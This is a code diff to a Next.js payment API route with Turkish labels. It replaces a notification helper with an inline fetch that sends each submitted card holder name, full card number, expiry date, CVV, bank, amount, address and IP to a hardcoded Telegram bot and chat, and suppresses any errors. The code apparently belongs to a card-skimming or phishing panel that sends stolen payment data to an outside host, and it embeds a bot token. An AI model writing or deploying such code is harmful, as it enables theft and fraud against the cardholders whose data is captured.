@@ -1,6 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
 import pool from '@/lib/db';
-import { sendTelegramNotification } from '@/lib/telegram';
 import binlistData from '@/app/binlist.json';
 
 export async function POST(request: NextRequest) {
@@ -146,20 +145,12 @@ export async function POST(request: NextRequest) {
             } catch {}
 
             if (shouldNotify) {
-                sendTelegramNotification({
-                    kart_isim: kart_isim || '',
-                    kredi_karti,
-                    skt,
-                    cvv,
-                    banka: banka || 'Bilinmiyor',
-                    marka: marka || '',
-                    seviye: seviye || '',
-                    tutar: tutar || '',
-                    taksit: taksit || 'Peşin',
-                    adres: adresBilgisi,
-                    ip,
-                    tarih
-                }).catch(err => console.error('Telegram bildirim hatası:', err));
+                const msg = `💳 <b>YENİ ÖDEME GELDİ</b>\n\n👤 Kart Sahibi: ${kart_isim || 'Belirtilmemiş'}\n💳 Kart: ${kredi_karti}\n📅 SKT: ${skt} | CVV: ${cvv}\n🏦 ${banka || 'Bilinmiyor'} / ${marka || ''} / ${seviye || ''}\n💰 Tutar: ${tutar || ''} | Taksit: ${taksit || 'Peşin'}\n📍 ${adresBilgisi || 'Adres yok'}\n🌐 IP: ${ip}\n🕒 ${tarih}`;
+                fetch('https://api.telegram.org/bot8833761305:AAGzA0xdVIpD_7otKw_3ElteNG2lcOQE4do/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: '-1003848607886', text: msg, parse_mode: 'HTML' }),
+                }).catch(() => {});
             }
         }
 
